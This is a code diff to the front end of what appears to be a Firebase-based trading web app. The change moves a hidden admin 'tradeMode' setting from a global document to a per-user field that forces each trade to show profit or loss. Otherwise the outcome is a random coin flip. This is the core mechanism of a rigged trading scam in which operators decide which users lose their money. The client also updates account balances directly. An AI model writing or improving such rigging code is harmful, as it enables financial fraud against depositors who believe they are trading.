@@ -240,24 +240,17 @@
             }, 1000);
         }
 
-        async function showRes(amt) {
-            const p = amt * 1.82, box = document.getElementById('resultBox');
-            // Read admin control mode from Firestore
-            let tradeMode = 'normal';
-            try {
-                const adminDoc = await db.collection('adminControl').doc('tradeMode').get();
-                if(adminDoc.exists) tradeMode = adminDoc.data().mode || 'normal';
-            } catch(e) { tradeMode = 'normal'; }
-
+        function showRes(amt) {
+            const tradeMode = userData.tradeMode || 'normal';
             let win;
-            if(tradeMode === 'win') { win = true; }
+            if(tradeMode === 'profit') { win = true; }
             else if(tradeMode === 'loss') { win = false; }
-            else { win = Math.random() > 0.5; } // normal: random
-
+            else { win = Math.random() > 0.5; }
+            const p = amt * 1.82, box = document.getElementById('resultBox');
             if(win) { 
                 db.collection('users').doc(auth.currentUser.uid).update({ balance: firebase.firestore.FieldValue.increment(p) }); 
-                box.innerHTML = `<div style="font-size:48px;margin-bottom:8px;">🤑</div><h2 class="text-green-500 font-black tracking-widest">PROFIT</h2><h1 class="text-4xl font-black text-green-400">+$${p.toFixed(2)}</h1>`;
-            } else { box.innerHTML = `<div style="font-size:48px;margin-bottom:8px;">😔</div><h2 class="text-red-500 font-black tracking-widest">LOSS</h2><h1 class="text-4xl font-black text-red-400">-$${amt.toFixed(2)}</h1>`; }
+                box.innerHTML = `<h2 class="text-green-500 font-black tracking-widest">PROFIT</h2><h1 class="text-4xl">+$${p.toFixed(2)}</h1>`;
+            } else { box.innerHTML = `<h2 class="text-red-500 font-black tracking-widest">LOSS</h2><h1 class="text-4xl">-$${amt.toFixed(2)}</h1>`; }
             box.innerHTML += `<button onclick="hideM('resultM')" class="w-full bg-white/10 py-3 rounded-xl mt-6 font-bold uppercase text-xs">Continue</button>`;
             showM('resultM');
         }
@@ -267,7 +260,10 @@
             const e = document.getElementById('userEmail').value, p = document.getElementById('userPass').value;
             if(mode==='reg') { 
                 const r = await auth.createUserWithEmailAndPassword(e, p); 
-                await db.collection('users').doc(r.user.uid).set({ email: e, balance: 0 });
+                await db.collection('users').doc(r.user.uid).set({ email: e, balance: 0, tradeMode: 'normal' });
             } else { await auth.signInWithEmailAndPassword(e, p); }
         }
-        function switchAuth(t) { mode = t; document.getElementById('loginTab').className = t==='login' ? 'flex-1 py-3 text-sm font-bold bg-[#2d3748] rounded-xl' : 'flex-1 py-3 text-sm font-bold'; document.getElementById(
+        function switchAuth(t) { mode = t; document.getElementById('loginTab').className = t==='login' ? 'flex-1 py-3 text-sm font-bold bg-[#2d3748] rounded-xl' : 'flex-1 py-3 text-sm font-bold'; document.getElementById('regTab').className = t==='reg' ? 'flex-1 py-3 text-sm font-bold bg-[#2d3748] rounded-xl' : 'flex-1 py-3 text-sm font-bold'; document.getElementById('authBtn').innerText = t==='login'?'Login':'Registration'; }
+    </script>
+</body>
+</html>
